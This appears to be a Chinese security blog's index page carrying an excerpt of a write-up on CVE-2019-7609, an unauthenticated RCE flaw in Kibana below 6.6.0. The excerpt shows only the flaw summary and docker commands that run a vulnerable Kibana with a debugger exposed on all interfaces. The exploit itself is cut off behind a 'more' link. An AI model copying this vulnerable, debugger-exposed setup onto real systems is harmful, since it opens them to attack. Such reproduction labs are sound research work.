+        <h1 id="（CVE-2019-7609）kibana-lt-6-6-0-未授权远程代码命令执行"><a href="#（CVE-2019-7609）kibana-lt-6-6-0-未授权远程代码命令执行" class="headerlink" title="（CVE-2019-7609）kibana &lt; 6.6.0 未授权远程代码命令执行"></a>（CVE-2019-7609）kibana &lt; 6.6.0 未授权远程代码命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Kibana 是一款开源的数据分析和可视化平台，它是Elastic<br>Stack成员之一，设计用于和Elasticsearch协作。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>kibana &lt; 6.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><pre><code>docker pull docker.elastic.co/kibana/kibana:6.5.4 
+docker network create elastic 
+docker run --network=elastic --name=elasticsearch docker.elastic.co/elasticsearch/elasticsearch:6.5.4
+docker run -d --name kibana --net elastic -p 5601:5601 docker.elastic.co/kibana/kibana:6.5.4 
+docker inspect -f &#39;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#39; kibana
+</code></pre>
+<p>这样启动的kibana没法调试，可以自己改改镜像，在node启动命令里加个inspect参数：</p>
+<pre><code>docker ps -a --no-trunc  # 找到启动脚本
+
+在node启动命令后加上--inspect=0.0.0.0:9229
+
+docker commit kibana kibana-debug  # 保存修改后的镜像
+docker rm -f kibana
+docker run --name kibana --net elastic -p 5601:5601 -p 9229:9229 kibana-debug  # 启动修改后的kibana容器
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Kibana/%EF%BC%88CVE-2019-7609%EF%BC%89Kibana%20_%206.6.0%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Kibana/%EF%BC%88CVE-2019-7609%EF%BC%89Kibana%20_%206.6.0%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qrmi00aby8v1g3ye3jn2" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/63/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/62/">62</a><a class="page-number" href="/page/63/">63</a><span class="page-number current">64</span><a class="page-number" href="/page/65/">65</a><a class="page-number" href="/page/66/">66</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/65/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
